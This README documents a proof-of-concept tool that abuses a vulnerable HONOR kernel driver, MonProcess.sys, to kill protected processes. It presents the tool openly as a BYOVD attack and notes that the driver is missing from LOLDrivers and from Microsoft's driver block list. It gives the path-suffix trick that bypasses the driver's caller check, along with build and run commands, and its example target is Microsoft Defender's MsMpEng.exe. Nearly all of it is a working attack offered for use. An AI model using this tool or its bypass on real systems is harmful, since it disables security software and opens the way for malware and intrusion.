# MonProcess-Killer
- PoC for vulnerability in MonProcess driver from HONOR (HnRSMService)
- `MonProcess.sys` SHA256: `8A8652604F7789A6259AE05266652580B18729E1F1C05612B9D338EB8379ECEE`
- As of 2026-08-15, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

## Auth Bypass

The driver checks the caller's image path using a **suffix match** against `\HONOR\HnRSMService\HnRSMService.exe` (case-insensitive). The executable that opens the device must be at a path ending with that suffix.

```bash
# Create the directory anywhere on disk and copy the files
mkdir <any_path>\HONOR\HnRSMService
copy MonProcess-Killer.exe <any_path>\HONOR\HnRSMService\HnRSMService.exe
copy MonProcess.sys <any_path>\HONOR\HnRSMService\
```

## Usage

Place `MonProcess.sys` in the same directory as the executable.

```text
BYOVD PPL-bypassing process killer using MonProcess.sys (HONOR)

Usage: HnRSMService.exe [OPTIONS] --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., MsMpEng.exe)
  -a, --attach               Attach to an already-loaded driver (skip service install/start/stop)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p MonProcess-Killer

# Run
<any_path>\HONOR\HnRSMService\HnRSMService.exe -n MsMpEng.exe

# Run against an already-loaded driver
<any_path>\HONOR\HnRSMService\HnRSMService.exe -n MsMpEng.exe --attach
```
